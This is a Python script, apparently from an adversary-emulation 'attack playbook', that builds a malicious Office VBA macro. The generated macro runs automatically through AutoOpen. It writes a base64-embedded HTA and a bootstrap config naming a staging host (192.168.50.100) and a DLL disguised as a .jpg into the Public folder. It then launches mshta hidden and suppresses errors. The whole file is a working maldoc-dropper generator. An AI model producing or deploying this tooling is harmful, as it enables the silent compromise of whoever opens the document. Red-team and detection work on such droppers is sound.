#!/usr/bin/env python3
"""Regenerate macro-payload.vba from compareforfor.hta.

The document must be self-contained: the macro carries the HTA and the bootstrap config as
base64 and writes both at open time. Run this after editing the HTA or the staging address.

Usage: python3 attack-playbook/payloads/build-macro.py
"""
import base64
import pathlib

HERE = pathlib.Path(__file__).resolve().parent
HTA = HERE / "compareforfor.hta"
OUT = HERE / "macro-payload.vba"

CONFIG = (
    "[bootstrap]\r\n"
    "http_host=192.168.50.100\r\n"
    "http_port=80\r\n"
    "dll_name=compareForfor.jpg\r\n"
    "dll_local_dir=C:\\Users\\Public\r\n"
).encode("ascii")


def chunks(data, size=700):
    text = base64.b64encode(data).decode("ascii")
    return [text[i:i + size] for i in range(0, len(text), size)]


def function(name, parts):
    lines = [f"Private Function {name}() As String"]
    for i, part in enumerate(parts):
        if i == 0:
            lines.append(f'    {name} = "{part}"')
        else:
            lines[-1] += " & _"
            lines.append(f'    "{part}"')
    lines.append("End Function")
    return "\n".join(lines)


TEMPLATE = """Attribute VB_Name = "c0015Entry"
' Generated by build-macro.py - do not edit by hand.
'
' On open the macro writes config.ini and compareforfor.hta into %PUBLIC%\\C0015 from the
' base64 blobs below, then starts mshta on the HTA. The document is the only delivered file.

Private Const TARGET_DIR As String = "\\C0015"
Private Const INI_NAME   As String = "config.ini"
Private Const HTA_NAME   As String = "compareforfor.hta"
Private m_bootstrapStarted As Boolean

Private Function B64Decode(s As String) As Variant
    Dim doc As Object, node As Object
    Set doc = CreateObject("MSXML2.DOMDocument")
    Set node = doc.createElement("b")
    node.DataType = "bin.base64"
    node.Text = s
    B64Decode = node.NodeTypedValue
End Function

Private Sub WriteBinary(path As String, b64 As String)
    Dim st As Object
    Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.Write B64Decode(b64)
    st.SaveToFile path, 2
    st.Close
End Sub

{ini}

{hta}

Private Sub RunEntry()
    If m_bootstrapStarted Then Exit Sub
    m_bootstrapStarted = True
    On Error GoTo FailSafe

    Dim fso As Object, base As String, iniPath As String, htaPath As String
    Set fso = CreateObject("Scripting.FileSystemObject")
    base = Environ("PUBLIC") & TARGET_DIR
    If Not fso.FolderExists(base) Then fso.CreateFolder base
    iniPath = base & "\\" & INI_NAME
    htaPath = base & "\\" & HTA_NAME

    WriteBinary iniPath, IniB64()
    WriteBinary htaPath, HtaB64()

    CreateObject("WScript.Shell").Run _
        """"C:\\Windows\\System32\\mshta.exe"" """ & htaPath & """", 0, False
    Exit Sub
FailSafe:
End Sub

Public Sub AutoOpen()
    RunEntry
End Sub
"""


def main():
    text = TEMPLATE.format(
        ini=function("IniB64", chunks(CONFIG)),
        hta=function("HtaB64", chunks(HTA.read_bytes())),
    )
    OUT.write_text(text, encoding="utf-8")
    print(f"wrote {OUT} ({len(text)} bytes)")


if __name__ == "__main__":
    main()
